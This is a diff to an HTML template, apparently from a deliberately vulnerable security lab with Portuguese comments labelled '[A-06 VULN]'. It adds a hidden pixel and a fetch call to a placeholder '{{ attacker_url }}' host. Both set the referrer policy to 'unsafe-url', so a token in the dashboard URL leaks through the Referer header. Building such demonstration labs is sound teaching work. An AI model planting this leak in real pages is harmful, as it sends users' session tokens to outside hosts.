@@ -17,18 +17,27 @@
 </div>
 
 <!-- RECURSO EXTERNO: o browser envia Referer ao carregar este pixel -->
+<!--
+  [A-06 VULN] referrerpolicy="unsafe-url" força o browser a enviar
+  a URL completa no header Referer, mesmo em pedidos cross-origin.
+  Sem este atributo, o browser aplica strict-origin-when-cross-origin
+  e envia apenas a origem (sem path/query), ocultando o token.
+-->
 <img src="{{ attacker_url }}/pixel.gif"
+     referrerpolicy="unsafe-url"
      width="1" height="1"
      alt=""
      onerror="console.log('[A-06] Attacker server recebeu o Referer com o token!')"
      style="position:absolute;opacity:0.01;">
 
-<!-- Script alternativo (mais visível no browser) -->
+<!-- Script alternativo com fetch (Referer completo via referrerPolicy) -->
 <script>
-  // [A-06] Força um fetch para o attacker server
-  // O browser inclui o header Referer automaticamente
-  var img = new Image();
-  img.src = "{{ attacker_url }}/log?source=sp1";
+  // [A-06] fetch com referrerPolicy: 'unsafe-url'
+  // O browser envia Referer: http://localhost:5001/dashboard?token=eyJ...
+  fetch("{{ attacker_url }}/log?source=sp1", {
+    referrerPolicy: "unsafe-url",
+    mode: "no-cors"
+  });
 </script>
 {% endif %}
 
